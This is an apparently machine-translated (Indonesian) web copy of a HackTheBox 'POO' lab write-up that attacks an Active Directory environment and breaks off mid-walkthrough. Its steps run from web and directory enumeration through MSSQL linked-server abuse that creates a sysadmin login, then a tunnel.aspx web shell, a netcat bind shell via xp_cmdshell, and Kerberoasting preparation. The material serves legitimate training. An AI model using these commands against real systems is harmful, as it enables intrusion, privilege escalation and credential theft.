<!doctype html>
<html class="no-js" lang="id">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üçº üë©üèª‚Äçüè´ üñêüèº HackTheBox endgame. Lulusnya Operasi Ofensif Profesional laboratorium. Direktori Aktif Pentest üòé üöπ ‚ôãÔ∏è</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Pada artikel ini, kami akan menganalisis bagian tidak hanya dari mobil, tetapi dari seluruh laboratorium mini dari situs HackTheBox . 
 
 Seperti yang...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>HackTheBox endgame. Lulusnya Operasi Ofensif Profesional laboratorium. Direktori Aktif Pentest</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/504912/"><img src="https://habrastorage.org/webt/ll/db/pf/lldbpf9fosinylfhu1pqlufombu.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pada artikel ini, kami akan menganalisis bagian tidak hanya dari mobil, tetapi dari seluruh laboratorium mini dari situs </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HackTheBox</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Seperti yang dinyatakan dalam deskripsi, POO dirancang untuk menguji keterampilan di semua tahap serangan di lingkungan Active Directory kecil. </font><font style="vertical-align: inherit;">Tujuannya adalah untuk mengkompromikan host yang tersedia, meningkatkan hak istimewa dan, akhirnya, kompromi seluruh domain, sambil mengumpulkan 5 bendera. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Koneksi ke laboratorium adalah melalui VPN. </font><font style="vertical-align: inherit;">Dianjurkan untuk tidak terhubung dari komputer kantor atau dari host di mana data yang penting bagi Anda tersedia, karena Anda berakhir di jaringan pribadi dengan orang-orang yang mengetahui sesuatu di bidang keamanan informasi :)</font></font><br>
<br>
<div class="spoiler" role="button" tabindex="0">
                        <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informasi Organisasi</font></font></b>
                        <div class="spoiler_text">      ,     ,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow">  Telegram</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow">    </a>   .    , ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow">    </a>.<br>
<a name="habracut"></a><br>
      .          ,  -      ,      .<br>
</div>
                    </div><br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Intro</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Endgame ini terdiri dari dua mesin, dan berisi 5 flag. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/jf/ta/u3/jftau3viawjhbuvlsvugzeynpsg.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Deskripsi dan alamat host yang tersedia juga diberikan. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/nf/4a/nt/nf4antkct0nsupc1f1i1ormic8c.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ayo mulai!</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Tandai kembali bendera</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mesin ini memiliki alamat IP 10.13.38.11, yang saya tambahkan ke / etc / hosts. </font></font><br>
<code>10.13.38.11 poo.htb</code><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pertama, kami memindai port terbuka. </font><font style="vertical-align: inherit;">Karena butuh waktu lama untuk memindai semua port dengan nmap, saya akan melakukan ini dengan masscan. </font><font style="vertical-align: inherit;">Kami memindai semua port TCP dan UDP dari antarmuka tun0 dengan kecepatan 500 paket per detik.</font></font><br>
<br>
<pre><code class="bash hljs">sudo masscan -e tun0 -p1-65535,U:1-65535 10.13.38.11 --rate=500</code></pre><br>
<img src="https://habrastorage.org/webt/7g/cb/s5/7gcbs55h9-dell4qd-zignmaoeo.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sekarang, untuk informasi lebih rinci tentang layanan yang beroperasi pada port, kami akan menjalankan pemindaian dengan opsi -A.</font></font><br>
<br>
<pre><code class="bash hljs">nmap -A poo.htb -p80,1433</code></pre><br>
<img src="https://habrastorage.org/webt/y-/sk/ok/y-skokeizveewte_fltnom0okqu.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Jadi, kita memiliki IIS dan MSSQL. </font><font style="vertical-align: inherit;">Dalam hal ini, kita akan mengetahui nama DNS asli dari domain dan komputer. </font><font style="vertical-align: inherit;">Di server web kami disambut oleh beranda IIS. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/7r/_o/at/7r_oattpcdbijvqviryrkkkukuo.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mari kita pergi melalui direktori. </font><font style="vertical-align: inherit;">Saya menggunakan gobuster untuk ini. </font><font style="vertical-align: inherit;">Dalam parameter kami menunjukkan jumlah aliran 128 (-t), URL (-u), kamus (-w) dan ekstensi yang menarik bagi kami (-x).</font></font><br>
<br>
<pre><code class="bash hljs">gobuster dir -t 128 -u poo.htb -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -x php,aspx,html</code></pre><br>
<img src="https://habrastorage.org/webt/4x/vp/ne/4xvpne3jutiluh2kl2bhzfg0wui.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dengan demikian, kami memiliki otentikasi HTTP untuk direktori / admin, serta file repositori layanan desktop yang tersedia .DS_Store. .DS_Store - ini adalah file yang menyimpan pengaturan pengguna untuk folder, seperti daftar file, lokasi ikon, gambar latar yang dipilih. File seperti itu dapat jatuh ke direktori server web pengembang web. Dengan demikian, kami mendapatkan informasi tentang isi direktori. Anda dapat menggunakan </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">perayap DS_Store untuk ini</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font><br>
<br>
<pre><code class="bash hljs">python3 dsstore_crawler.py -i http://poo.htb/</code></pre><br>
<img src="https://habrastorage.org/webt/77/zh/0r/77zh0rmu9cj-vabbdpm8jiaw8zi.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kami mendapatkan isi direktori. </font><font style="vertical-align: inherit;">Hal yang paling menarik di sini adalah direktori / dev, dari mana kita dapat melihat sumber dan file db di dua cabang. </font><font style="vertical-align: inherit;">Tapi kita bisa 6 karakter pertama nama file dan direktori jika layanan rentan terhadap IIS ShortName. </font><font style="vertical-align: inherit;">Untuk memeriksa kerentanan ini, gunakan </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pemindai nama pendek IIS</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ot/f0/p-/otf0p-hgyj8-j0jwomo0qkhwsi8.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan kita pergi ke satu file teks yang dimulai dengan "poo_co". </font><font style="vertical-align: inherit;">Tidak tahu apa yang harus dilakukan selanjutnya, saya cukup memilih semua kata yang dimulai dengan "co" dari kamus direktori.</font></font><br>
<br>
<pre><code class="bash hljs">cat /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt | grep -i <span class="hljs-string">"^co"</span> &gt; co_words.txt</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan beralih melalui wfuzz.</font></font><br>
<br>
<pre><code class="bash hljs">wfuzz -w ./co_words.txt -u <span class="hljs-string">"http://poo.htb/dev/dca66d38fd916317687e1390a420c3fc/db/poo_FUZZ.txt"</span> --hc 404</code></pre><br>
<img src="https://habrastorage.org/webt/df/vp/i7/dfvpi7shl4g953vkrzy0dygx3lm.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan kami menemukan kata yang tepat! </font><font style="vertical-align: inherit;">Kami melihat file ini, menyimpan kredensial (dilihat dari parameter DBNAME, mereka dari MSSQL). </font></font><br>
<br>
<img src="https://habrastorage.org/webt/bz/uh/ma/bzuhma7s5vhi04vfjenyjszrf6y.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kami menyerahkan bendera, dan kami bergerak maju sebesar 20%.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/jr/qw/8h/jrqw8h8m7zidufasmq00o2rxwwu.png" alt="gambar"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bendera ya</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kami terhubung ke MSSQL, saya menggunakan DBeaver. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/mb/uz/oe/mbuzoecjnyrt8tudpdppjocedkq.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kami tidak menemukan sesuatu yang menarik dalam database ini, mari kita buat SQL Editor dan periksa apa itu pengguna.</font></font><br>
<br>
<pre><code class="sql hljs"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">name</span> <span class="hljs-keyword">FROM</span> master..syslogins;</code></pre><br>
<img src="https://habrastorage.org/webt/gq/my/vo/gqmyvoomdmrrjgeijvtaupu3r0c.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kami memiliki dua pengguna. </font><font style="vertical-align: inherit;">Mari kita periksa hak istimewa kita.</font></font><br>
<br>
<pre><code class="sql hljs"><span class="hljs-keyword">SELECT</span> is_srvrolemember(<span class="hljs-string">'sysadmin'</span>), is_srvrolemember(<span class="hljs-string">'dbcreator'</span>), is_srvrolemember(<span class="hljs-string">'bulkadmin'</span>), is_srvrolemember(<span class="hljs-string">'diskadmin'</span>), is_srvrolemember(<span class="hljs-string">'processadmin'</span>), is_srvrolemember(<span class="hljs-string">'serveradmin'</span>), is_srvrolemember(<span class="hljs-string">'setupadmin'</span>), is_srvrolemember(<span class="hljs-string">'securityadmin'</span>);</code></pre><br>
<img src="https://habrastorage.org/webt/l2/en/-m/l2en-mjodydm3nor3bzrmntm02u.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dengan demikian, tidak ada hak istimewa. </font><font style="vertical-align: inherit;">Mari kita lihat server terkait, tentang teknik ini saya tulis secara rinci di </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sini</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font><br>
<br>
<pre><code class="sql hljs"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> master..sysservers;</code></pre><br>
<img src="https://habrastorage.org/webt/ib/8b/yz/ib8byzrmsrnehhyol8rcvhek09k.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Jadi kami menemukan SQL Server lain. </font><font style="vertical-align: inherit;">Mari kita periksa eksekusi perintah di server ini menggunakan openquery ().</font></font><br>
<br>
<pre><code class="sql hljs"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">version</span> <span class="hljs-keyword">FROM</span> openquery(<span class="hljs-string">"COMPATIBILITY\POO_CONFIG"</span>, <span class="hljs-string">'select @@version as version'</span>);</code></pre><br>
<img src="https://habrastorage.org/webt/ui/-p/pz/ui-ppzlkg7nnonnt7ybzvk_lq-e.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan kita bahkan dapat membangun pohon permintaan.</font></font><br>
<br>
<pre><code class="sql hljs"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">version</span> <span class="hljs-keyword">FROM</span> openquery(<span class="hljs-string">"COMPATIBILITY\POO_CONFIG"</span>, <span class="hljs-string">'SELECT version FROM openquery("COMPATIBILITY\POO_PUBLIC", ''select @@version as version'');'</span>);</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Faktanya adalah bahwa ketika kami mengeksekusi permintaan ke server yang ditautkan, permintaan tersebut dieksekusi dalam konteks pengguna lain! </font><font style="vertical-align: inherit;">Mari kita lihat dalam konteks pengguna mana yang sedang kami kerjakan pada server yang tertaut.</font></font><br>
<br>
<pre><code class="sql hljs"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">name</span> <span class="hljs-keyword">FROM</span> openquery(<span class="hljs-string">"COMPATIBILITY\POO_CONFIG"</span>, <span class="hljs-string">'SELECT user_name() as name'</span>);</code></pre><br>
<img src="https://habrastorage.org/webt/gn/bk/pv/gnbkpv1aqvrqeeybcw3lva0zpvw.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sekarang mari kita lihat dalam konteks apa permintaan dari server yang terhubung ke server kita dieksekusi!</font></font><br>
<br>
<pre><code class="sql hljs"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> openquery(<span class="hljs-string">"COMPATIBILITY\POO_CONFIG"</span>, <span class="hljs-string">'SELECT name FROM openquery("COMPATIBILITY\POO_PUBLIC", ''SELECT user_name() as name'');'</span>);</code></pre><br>
<img src="https://habrastorage.org/webt/wx/yf/v3/wxyfv38lujrvb1zybe4eugmuq7c.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dengan demikian, ini adalah konteks DBO yang harus memiliki semua hak istimewa. </font><font style="vertical-align: inherit;">Mari kita periksa hak istimewa jika ada permintaan dari server yang tertaut.</font></font><br>
<br>
<pre><code class="sql hljs"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> openquery(<span class="hljs-string">"COMPATIBILITY\POO_CONFIG"</span>, <span class="hljs-string">'SELECT * FROM openquery("COMPATIBILITY\POO_PUBLIC", ''SELECT is_srvrolemember(''''sysadmin''''), is_srvrolemember(''''dbcreator''''), is_srvrolemember(''''bulkadmin''''), is_srvrolemember(''''diskadmin''''), is_srvrolemember(''''processadmin''''), is_srvrolemember(''''serveradmin''''), is_srvrolemember(''''setupadmin''''), is_srvrolemember(''''securityadmin'''')'')'</span>);</code></pre><br>
<img src="https://habrastorage.org/webt/q8/f9/rf/q8f9rf6khxsnd-zhz-lzjo8pgmk.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Seperti yang Anda lihat, kami memiliki semua hak istimewa! </font><font style="vertical-align: inherit;">Mari buat admin kami dengan cara ini. </font><font style="vertical-align: inherit;">Tetapi mereka tidak membiarkannya melalui openquery, mari kita lakukan melalui EXECUTE AT.</font></font><br>
<br>
<pre><code class="sql hljs"><span class="hljs-keyword">EXECUTE</span>(<span class="hljs-string">'EXECUTE(''CREATE LOGIN [ralf] WITH PASSWORD=N''''ralfralf'''', DEFAULT_DATABASE=[master], CHECK_EXPIRATION=OFF, CHECK_POLICY=OFF'') AT "COMPATIBILITY\POO_PUBLIC"'</span>) <span class="hljs-keyword">AT</span> <span class="hljs-string">"COMPATIBILITY\POO_CONFIG"</span>;
<span class="hljs-keyword">EXECUTE</span>(<span class="hljs-string">'EXECUTE(''CREATE USER [ralf] FOR LOGIN [ralf]'') AT "COMPATIBILITY\POO_PUBLIC"'</span>) <span class="hljs-keyword">AT</span> <span class="hljs-string">"COMPATIBILITY\POO_CONFIG"</span>;
<span class="hljs-keyword">EXECUTE</span>(<span class="hljs-string">'EXECUTE(''ALTER SERVER ROLE [sysadmin] ADD MEMBER [ralf]'') AT "COMPATIBILITY\POO_PUBLIC"'</span>) <span class="hljs-keyword">AT</span> <span class="hljs-string">"COMPATIBILITY\POO_CONFIG"</span>;
<span class="hljs-keyword">EXECUTE</span>(<span class="hljs-string">'EXECUTE(''ALTER ROLE [db_owner] ADD MEMBER [ralf]'') AT "COMPATIBILITY\POO_PUBLIC"'</span>) <span class="hljs-keyword">AT</span> <span class="hljs-string">"COMPATIBILITY\POO_CONFIG"</span>;</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan sekarang kita terhubung dengan kredensial pengguna baru, kita amati basis data bendera baru. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/vc/-j/qr/vc-jqrpv9wi1bxugpnohq1oblwc.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kami menyerahkan bendera ini dan melanjutkan.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/bt/79/m8/bt79m8kpxd1njvb_qivfcfyiogm.png" alt="gambar"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Mundur bendera</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kami akan mendapatkan shell menggunakan MSSQL, saya menggunakan mssqlclient dari paket impacket.</font></font><br>
<br>
<pre><code class="bash hljs">mssqlclient.py ralf:ralfralf@poo.htb -db POO_PUBLIC</code></pre><br>
<img src="https://habrastorage.org/webt/vw/1m/5c/vw1m5c_5g6gunrmfrsvlcmiwocu.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kami perlu mendapatkan kata sandi, dan hal pertama yang kami temui adalah situs. </font><font style="vertical-align: inherit;">Oleh karena itu, kita memerlukan konfigurasi server web (tidak mungkin untuk membuang shell yang mudah digunakan, tampaknya firewall berfungsi). </font></font><br>
<br>
<img src="https://habrastorage.org/webt/lu/np/fj/lunpfjjjb_skynbrs3aa4tgq_vw.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tetapi akses ditolak. </font><font style="vertical-align: inherit;">Meskipun kami dapat membaca file dari MSSQL, Anda hanya perlu tahu bahasa pemrograman apa yang dikonfigurasi. </font><font style="vertical-align: inherit;">Dan dalam direktori MSSQL kami mencari tahu apa itu Python. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/b_/aa/yf/b_aayfsyx5g9tchc31vwmpl7j_0.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kemudian baca file web.config tidak ada masalah.</font></font><br>
<br>
<pre><code class="sql hljs">EXEC sp_execute_external_script<font></font>
@language = N'Python',<font></font>
@script = "print(open('C:\inetpub\wwwroot\web.config').read())"</code></pre><br>
<img src="https://habrastorage.org/webt/0-/ym/1a/0-ym1a-5vdoclblu5cf7dzlr2hu.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Setelah kredensial ditemukan, buka / admin dan ambil benderanya.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/5b/dw/1w/5bdw1wdytul7engqv7fsh5m6isg.png" alt="gambar"><br>
<br>
<img src="https://habrastorage.org/webt/g4/xx/sj/g4xxsjytoegqy6rj4qcq3vmkkz8.png" alt="gambar"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bendera yang halus</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Bahkan, ada beberapa ketidaknyamanan menggunakan firewall, tetapi melihat pengaturan jaringan, kami melihat bahwa tusukan IPv6 juga digunakan! </font></font><br>
<br>
<img src="https://habrastorage.org/webt/mx/ow/ov/mxowovlytjpaivc7tita6skyevi.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tambahkan alamat ini ke / etc / hosts. </font></font><br>
<code>dead:babe::1001 poo6.htb</code><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mari memindai host lagi, tetapi menggunakan IPv6. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/v-/kv/wx/v-kvwx7txlijyfcix-1ozsdpe1y.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan lebih dari IPv6, layanan WinRM tersedia. </font><font style="vertical-align: inherit;">Terhubung dengan kredensial yang ditemukan. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/gj/wv/oq/gjwvoqcwb7a3gxryr3pwanwhv98.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ada bendera di desktop, kami serahkan.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/s4/ds/0d/s4ds0d0oeaxze0atpnany4mxyli.png" alt="gambar"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bendera P00ned</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Setelah pengintaian pada tuan rumah menggunakan </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">winpeas, kami</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> tidak menemukan sesuatu yang istimewa. </font><font style="vertical-align: inherit;">Kemudian diputuskan untuk mencari lagi kredensial (saya juga menulis </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">artikel</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> tentang topik ini </font><font style="vertical-align: inherit;">). </font><font style="vertical-align: inherit;">Tapi saya tidak berhasil mendapatkan semua SPN dari sistem melalui WinRM.</font></font><br>
<br>
<pre><code class="powershell hljs">setspn.exe <span class="hljs-literal">-T</span> intranet.poo <span class="hljs-literal">-Q</span> */*</code></pre><br>
<img src="https://habrastorage.org/webt/nx/ir/vo/nxirvooymoxzd2a3ykan9vjrxqk.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mari kita jalankan perintah melalui MSSQL. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/v6/ss/p5/v6ssp5cszem2yonza1dqqffodwm.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dengan cara ini, kita mendapatkan SPN pengguna p00_hr dan p00_adm, yang berarti mereka rentan terhadap serangan seperti Kerberoasting. Singkatnya, kita bisa mendapatkan hash kata sandi mereka. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pertama, Anda perlu mendapatkan shell yang stabil atas nama pengguna MSSQL. Tetapi karena akses kami terbatas, kami hanya memiliki akses ke host melalui port 80 dan 1433. Tetapi adalah mungkin untuk mengarahkan lalu lintas melalui port 80! Untuk melakukan ini, kami menggunakan </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">aplikasi berikut</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . Unduh file tunnel.aspx ke direktori home server web - C: \ inetpub \ wwwroot \. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ng/y6/tv/ngy6tv9oa8l03osxh8eeqb4wkz8.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tetapi ketika kita mencoba mengaksesnya, kita mendapatkan kesalahan 404. Ini berarti bahwa file * .aspx tidak dieksekusi. Agar file dengan ekstensi ini mulai dijalankan, instal ASP.NET 4.5 sebagai berikut.</font></font><br>
<br>
<pre><code class="powershell hljs">dism /online /<span class="hljs-built_in">enable-feature</span> /all /featurename:IIS<span class="hljs-literal">-ASPNET45</span></code></pre><br>
<img src="https://habrastorage.org/webt/sa/gg/qb/saggqboooa8-mixgpvgvdc3qpju.png" alt="gambar"><br>
<br>
<img src="https://habrastorage.org/webt/h6/zf/r0/h6zfr09aw4cjqej44_vr3mvgnzk.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan sekarang ketika mengakses tunnel.aspx kita mendapatkan jawaban bahwa semuanya siap untuk bekerja. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/xg/va/lk/xgvalkwby7e3xavkdejfve9csqm.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mari kita luncurkan bagian klien dari aplikasi, yang akan menangani pengiriman lalu lintas. </font><font style="vertical-align: inherit;">Kami akan mengarahkan semua lalu lintas dari port 5432 ke server.</font></font><br>
<br>
<pre><code class="bash hljs">python ./reGeorgSocksProxy.py -p 5432 -u http://poo.htb/tunnel.aspx</code></pre><br>
<img src="https://habrastorage.org/webt/cv/0i/q-/cv0iq-rnaufojba-cytfpf4ar_e.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan kami menggunakan rantai proxy untuk mengirimkan lalu lintas ke aplikasi apa pun melalui proxy kami. </font><font style="vertical-align: inherit;">Tambahkan proxy ini ke file konfigurasi /etc/proxychains.conf. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/8c/lm/bc/8clmbciziz9pxbcj2nqs6hpqtbg.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sekarang kita akan mengunggah program </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">netcat</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ke server </font><font style="vertical-align: inherit;">, dengan bantuan yang mana kita akan membuat bind shell yang stabil, dan </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">skrip Invoke-Kerberoast</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , yang dengannya kita akan melakukan serangan Kerberoasting. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/4v/gv/ba/4vgvbaedkvn8dqgvybvcimejjkc.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sekarang melalui MSSQL kita mulai pendengar.</font></font><br>
<br>
<pre><code class="powershell hljs">xp_cmdshell C:\temp\nc64.exe <span class="hljs-literal">-e</span> powershell.exe <span class="hljs-literal">-lvp</span> <span class="hljs-number">4321</span></code></pre><br>
<img src="https://habrastorage.org/webt/dw/hz/dg/dwhzdgej2d3o0jrglizcambdwym.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan terhubung melalui proxy kami.</font></font><br>
<br>
<pre><code class="bash hljs">proxychains rlwrap nc poo.htb 4321</code></pre><br>
